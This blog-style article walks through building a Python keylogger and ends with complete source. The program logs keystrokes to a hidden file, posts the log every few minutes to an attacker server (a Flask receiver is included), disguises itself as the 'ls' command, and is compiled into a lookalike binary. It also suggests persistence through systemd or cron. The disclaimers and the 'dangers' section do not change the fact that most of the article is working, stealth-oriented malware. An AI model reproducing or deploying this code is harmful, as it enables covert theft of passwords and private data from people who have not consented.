---
title: 'The perils of Python: How to program a KeyLogger (easy)'
date: 'Jun 14, 2024'
description: 'Discover the Hidden Dangers of Python: Learn how to program a Keylogger and know its Impact on Digital Security.'
category: 'Article'
cover: 'https://i.postimg.cc/1RFR9vsL/1-T4sf-ky-Gi5Wk-Z3RCHImo-IQ.webp'
tags: ['Python', 'Keylogger', 'Keylogger Software',]
---

## Introduction

Keyloggers are malicious programs designed to record keystrokes made by a user without their knowledge. These logs can include passwords, messages and other sensitive information, which are then sent to the attacker. Keyloggers can be used to collect sensitive information in a clandestine manner and can pose a serious threat to privacy and personal data security.

In this article, we will explore how to program a keylogger using Python. It is essential to keep in mind that this type of software should only be developed and run with permissions and in a controlled environment, exclusively for educational purposes to understand how they work and learn how to protect against them. It is important to be aware of how easy it can be to create a keylogger and the danger it poses to personal security and online privacy.

---

## Dangers

Python presents several potential dangers due to its ability to create malicious servers and execute unverified code downloaded from repositories such as GitHub, which can expose users to malicious scripts that compromise the security of their system or the privacy of sensitive data. It is essential to exercise caution when selecting and executing Python code to avoid vulnerabilities and potential exploits.

As for keyloggers, they represent a serious threat due to their ability to secretly record all keystrokes, including passwords and financial data, putting personal and corporate privacy at risk. These malicious programs are difficult to detect and can be used in targeted cyber-attacks to steal confidential information, compromise critical systems and facilitate illegal actions such as blackmail and identity theft. It is critical to be aware of these risks and take rigorous preventative measures, including constant software updates, the use of robust security tools, and ongoing education on safe online practices and programming to mitigate these dangers.

Dangers of Keyloggers:

1. **Theft of Confidential Information**: Keyloggers record all keystrokes made by a user, capturing passwords, financial data, private conversations and other sensitive information.
2. **Threat to Personal and Corporate Privacy**: The use of keyloggers can expose privacy in both personal and corporate environments. Captured data can be used for blackmail, identity theft, or to gain unauthorized access to systems and networks.
3. **Difficult to Detect**: Some keyloggers are designed to be stealthy and difficult to detect by conventional anti-virus or anti-malware software, making them especially dangerous to users and organizations that are not prepared to adequately protect themselves.
4. **Cyber Security Impact**: Keyloggers are common tools in targeted cyber attacks, used to initially gather information and then facilitate more serious intrusions, such as massive data theft or manipulation of critical systems.
5. **Illegal Use and Legal Consequences**: The creation, distribution or use of keyloggers with malicious intent can have serious legal consequences, including criminal prosecution and significant fines.

It is essential to always be aware of these risks and take appropriate preventive measures, such as keeping software up to date, using reliable security tools, and educating users about safe online and programming practices.

---

## Code

```
"""
⚠ This Python keylogger demonstration code is provided strictly for educational
purposes. Creating, distributing or executing keyloggers with malicious intent
is illegal and may result in severe legal consequences. It is critical to use 
this code only in a controlled environment and with appropriate permissions. 
Never use this code to access or record information without the express consent
of all parties involved.
"""
```

The basis of a KeyLogger in python is very simple. It consists of a library and a simple function for logging keystrokes. With this code of only 12 lines, you could program one.

```
import keyboard

class Typed:

    def _onConclusionType(event):print(f"Key pressed: {event.name}")
    def run():keyboard.on_press(Typed._onType)

if __name__ == '__main__':
    try: 
        Typed.run()
        keyboard.wait()
    except KeyboardInterrupt:pass
```

In addition, to make it do its logger function, you only have to modify the content (*currently it does a print*) of this function def `_onType(event): print(f"Key pressed: {event.name}")` for this one (*which saves the key pressed in a text file*) `def _onType(event): Save._save(event.name)` and add only 9 more lines of code that will give you the path to save the file and write the file.

```
import os

class Save:

    def getPath() -> str:
        try:return str(os.path.join(os.path.expanduser('~'), ".keylog"))
        except:return "/tmp/.keylog"
    
    def _save(key:str):
        with open(Save.getPath(), 'a') as hiddenFile:
            hiddenFile.write(key + '\n')
        hiddenFile.close()
```

In addition, the attacker will want to remotely obtain the log file, so he will have to create a function that will be in charge of sending the entire log file. On the one hand, in the KeyLogger, he will add the following code, in charge of sending the data and scheduling the task to be performed every 5 minutes:

```
import requests

class Send:
    
    def _send(file:str) -> None:

        SDD_IP = "127.0.0.1" # stolenDataDestination_IP
        SDD_PORT = 4444 # stolenDataDestination_PORT

        try:
            response = requests.post(
                url=f"http://{SDD_IP}:{SDD_PORT}",
                files={'file': file}
            )
        except Exception:pass

    def _schedule(scheduler)  -> None:

        try: 
            # 5 minutes = 5 * 60 = 300 seconds
            scheduler.enter(300, 1, Send._schedule, (scheduler,))
            with open(Save.getPath(), 'rb') as fileSend:
                Send._send(file=fileSend)
        except:pass
```

And this boot function will be in charge of managing two threads, one in charge of managing the keylogging and saving (su ), and a second thread for sending it to the malicious server:

```
import sched
import time
import threading

class Boot:

    def _doScheduler():
        scheduler = sched.scheduler(time.time, time.sleep)
        scheduler.enter(0, 1, Send._schedule, (scheduler,))

    def _doLogger():
        try:Typed.run();keyboard.wait()
        except KeyboardInterrupt:pass

    def __init__(self) -> None:
        
        sendThread = threading.Thread(target=Boot._doScheduler)
        loggerThread = threading.Thread(target=Boot._doLogger)
    
        sendThread.start();loggerThread.start();
        sendThread.join();loggerThread.join()
```

The `if __name__ == '__main__'` would now look like this: `if __name__ == '__main__': Boot()`.

On the other hand, from the attacker’s server side with this code that is aided by the pip flask libraries, he would have to continuously run the following script:

```
from flask import Flask, request, jsonify
import os

app = Flask(__name__)

@app.route('/', methods=['POST'])
def upload_file():
    
    if 'file' not in request.files:return jsonify({'error': 'No file part'}), 400

    file = request.files['file']
    if file.filename == '':return jsonify({'error': 'No selected file'}), 400

    if file:
        os.makedirs("./saves", exist_ok=True)
        
        filename = f"keylogger_{request.remote_addr}.txt"
        filepath = os.path.join("./saves", filename)
        file.save(filepath)

        print(f"KeyLogger File saved on: {filepath}")
        return jsonify({'success': True}), 200
    
    else:return jsonify({'error': 'File not saved'}), 400

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=4444)
```

This code uses Flask to create a web server that accepts files sent via POST requests to the main path (‘/’). When it receives a request, it checks if there is an attached file and if the file name is not empty. It then creates a directory called ./saves if it does not already exist, and saves the file with a name that includes the IP address of the client that sent it, followed by the extension .txt. The server responds with a success message if the file is saved successfully, along with an HTTP status code 200, or returns an error message and code 400 if any problems occur during the saving process. This approach ensures that the server can handle and store received files in an organized manner and with relevant contextual information in the file name.

Here is some more documentation on the Flask library:

- [Pypi Flask Package](https://pypi.org/project/Flask/)
- [Flask Docs](https://flask.palletsprojects.com/en/stable/)

Finally, an average user with a bit of intelligence would never run a file called keylogger.py, even if downloaded from a browser we might get warning messages like the one in the screenshot below.

![](https://i.postimg.cc/85R1bCKC/1-f-L8SFPj-Qq-Zlx-Dj-Sr0Evimg.webp)

> Translation [ES-EN]: This file could be dangerous: The file type “keylogger.py” could harm your computer. Download it only if you are aware of the risks involved.

Therefore, we are going to perform some final steps to have a fully functional and hidden KeyLogger. We will add in the `if __name__ == '__main__'` the following code, since my idea is to simulate the ls (ListDirectory) command:

```
if __name__ == '__main__':
    try:
        print(f"{subprocess.check_output(['ls']).decode('utf-8')}")
    except:pass
    finally:Boot()
```

Now, every time it is executed, it will pretend to be the ls command and will list all the contents of the command where it is being executed. Also, we will add a line of code in which we will make that our script is executed in the background to not raise suspicions, but, for the tests that I have been making this there are occasions in which it is duplicated in a recursive way and in an infinite loop reason why I do not recommend to add it:

```
subprocess.Popen([sys.executable, sys.argv[0]])
```

In addition, we will compile the python script to convert it into a binary and give the real appearance of a Linux app. To do this we will install this pip library: pyinstallery and run this command:

```
pyinstaller --onefile keylogger.py
```

> As I mentioned before, the background thing doesn’t usually work, or at least I don’t have the knowledge to make the script itself go back to the background, so a “good” idea could be to make it a service (which is what is usually done) and have systemctl or cronjobs take care of executing it

Then, we will go to the “dist” folder and rename the binary by the name of the command we have set, which in this case is “ls”.

As I mentioned before, the background thing doesn’t usually work, or at least I don’t have the knowledge to make the script itself go back to the background, so a “good” idea could be to make it a service (which is what is usually done) and have systemctl or cronjobs take care of executing it

**Advertisement**: It is necessary to clarify, that the library “keyboard” requests to be root, so if any LS ever asks you for it, think twice before giving it permissions.

This KeyLogger, is a fairly simple script, which could be improved a lot more to get the information of what app or what web page is being typed, as well as put the whole words and interpret the special keys like “TAB”, “ALT”, “BACKSPACE”, … But my intention is not to make it complete but to show how simple it is, and the dangers that can lead to get to run one on your computer.

```
"""
  ⚠ This Python keylogger demonstration code is provided strictly for educational
purposes. Creating, distributing or executing keyloggers with malicious intent
is illegal and may result in severe legal consequences. It is critical to use 
this code only in a controlled environment and with appropriate permissions. 
Never use this code to access or record information without the express consent
of all parties involved.
"""

import os, keyboard, requests, \
    sched, time, threading, \
    subprocess, sys

class Send:
    
    @staticmethod
    def _send(file:str) -> None:

        SDD_IP = "127.0.0.1" # stolenDataDestination_IP
        SDD_PORT = 4444 # stolenDataDestination_PORT

        try:
            response = requests.post(
                url=f"http://{SDD_IP}:{SDD_PORT}",
                files={'file': file}
            )
        except Exception:pass

    @staticmethod
    def _schedule(scheduler)  -> None:

        try: 
            # 5 minutes = 5 * 60 = 300 seconds
            scheduler.enter(30, 1, Send._schedule, (scheduler,))
            with open(Save.getPath(), 'rb') as fileSend:
                Send._send(file=fileSend)
        except:pass

class Save:

    @staticmethod
    def getPath() -> str:
        
        try:return str(os.path.join(os.path.expanduser('~'), ".keylog"))
        except:return "/tmp/.keylog"
    
    @staticmethod
    def _save(key:str) -> None:

        with open(Save.getPath(), 'a') as hiddenFile:
            hiddenFile.write(key + '\n')
        hiddenFile.close()

class Typed:

    @staticmethod
    def _onType(event) -> None:Save._save(event.name)
    
    @staticmethod
    def run() -> None:keyboard.on_press(Typed._onType)

class Boot:

    @staticmethod
    def _doScheduler():

        scheduler = sched.scheduler(time.time, time.sleep)
        scheduler.enter(0, 1, Send._schedule, (scheduler,))
        scheduler.run()

    @staticmethod
    def _doLogger():

        try:Typed.run();keyboard.wait()
        except KeyboardInterrupt:pass

    def __init__(self) -> None:
        
        sendThread = threading.Thread(target=Boot._doScheduler)
        loggerThread = threading.Thread(target=Boot._doLogger)
        sendThread.start();loggerThread.start()
        sendThread.join();loggerThread.join()

if __name__ == '__main__':
    try:
        subprocess.Popen([sys.executable, sys.argv[0]])
        try:
            print(f"{subprocess.check_output(['ls']).decode('utf-8')}")
        except:pass
        finally:Boot()
    except:pass
```

---

## Conclusion

In conclusion, the exploration of Python’s potential dangers highlights its capability to facilitate the creation of malicious servers and the execution of unverified code, posing significant risks to system security and data privacy. Coupled with the inherent threat of keyloggers, which clandestinely capture sensitive keystrokes and pose serious implications for personal and corporate privacy, these vulnerabilities underscore the critical need for vigilance and proactive measures. Programming a keylogger in Python, as demonstrated here, exemplifies the ease with which such malicious tools can be developed, emphasizing the importance of strict ethical guidelines and controlled environments for educational purposes only. Awareness of these risks and the adoption of stringent security practices are imperative to mitigate the pervasive threats posed by these technologies in today’s digital landscape.